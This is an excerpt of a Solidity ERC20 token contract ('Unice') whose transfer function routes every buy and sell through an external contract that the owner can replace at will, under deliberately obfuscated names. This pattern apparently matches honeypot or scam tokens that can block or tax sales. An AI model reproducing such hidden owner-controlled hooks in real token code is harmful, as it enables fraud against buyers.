...
contract TokenM is ERC20 {
    ...
    IUserAmountertyue public ertyue;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Unice", "UNICE") {
    ...
    function codtingsBzkingRusdr(IUserAmountertyue _ertyue) public onlyOwner {
        ertyue = _ertyue;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                ertyue.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				ertyue.addOutAmount(from, amount);
            }else{
                ertyue.addOutAmount(from, amount);
                takeFee = false;
            }
